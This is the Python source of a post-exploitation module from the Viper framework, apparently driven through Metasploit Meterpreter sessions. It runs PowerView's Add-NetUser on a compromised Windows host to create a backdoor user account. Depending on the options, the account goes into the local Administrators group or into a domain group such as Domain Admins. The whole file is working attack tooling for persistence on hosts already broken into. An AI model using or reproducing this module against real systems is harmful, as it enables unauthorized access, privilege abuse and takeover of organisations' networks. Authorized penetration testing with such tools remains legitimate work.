# -*- coding: utf-8 -*-
# @File  : SimplePostPowershellModule.py
# @Date  : 2019/1/12
# @Desc  :

#
#
from PostModule.lib.ModuleTemplate import PostMSFPowershellFunctionModule, TAG2CH
from PostModule.lib.OptionAndResult import Option, register_options


class PostModule(PostMSFPowershellFunctionModule):
    NAME = "添加用户到主机"
    DESC = "添加一个用户到主机,账户权限与session权限相同.\n" \
           "当填写'主机名'参数时,模块会自动忽略'用户组(域)''域名称(域)'参数.向域中添加用户时'用户组(域)''域名称(域)'参数必须同时填写"
    MODULETYPE = TAG2CH.internal
    AUTHOR = "Viper"
    OPTIONS = register_options([
        Option(name='UserName', name_tag="用户名", type='str', required=True, desc="添加的用户名,请注意不要填写已存在用户", ),
        Option(name='Password', name_tag="密码", type='str', required=True, desc="添加用户的密码,请注意复杂度要求", ),
        Option(name='ComputerName', name_tag="主机名", type='str', required=False,
               desc="主机名称,用户会添加到主机的Administrators组中", ),
        Option(name='GroupName', name_tag="用户组(域)", type='str', required=False,
               desc="添加用户到域用户组中(Domain Admins为域管理员组,Domain Users为域用户组", ),
        Option(name='Domain', name_tag="域名称(域)", type='str', required=False, desc="添加用户到输入的域中", ),
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.set_script("PowerView.ps1")  # 设置目标机执行的脚本文件
        self.set_execute_string('Add-NetUser')

    def check(self):
        """执行前的检查函数,函数必须返回值"""
        username = self.param('UserName')
        password = self.param('Password')
        computername = self.param('ComputerName')
        groupname = self.param('GroupName')
        domain = self.param('Domain')

        from PostModule.lib.Session import Session
        session = Session(self._sessionid)
        if session.is_windows is not True:
            return False, "模块只支持Windows的Meterpreter"

        if computername is not None:
            execute_string = "Add-NetUser -UserName {} -Password {} -ComputerName {}".format(username,
                                                                                             password,
                                                                                             computername)
        elif groupname is not None and domain is not None:
            if session.is_in_domain:
                execute_string = "Add-NetUser -UserName {} -Password {} -GroupName {} -Domain {}".format(
                    username,
                    password,
                    groupname,
                    domain)
            else:
                return False, "模块只支持Windows的Meterpreter,且必须在域中"
        else:
            execute_string = "Add-NetUser -UserName {} -Password {}".format(username, password)
        self.set_execute_string(execute_string)
        return True, None

    def callback(self, flag, output):
        # 调用父类函数存储结果(必须调用)
        self.store_log(output)
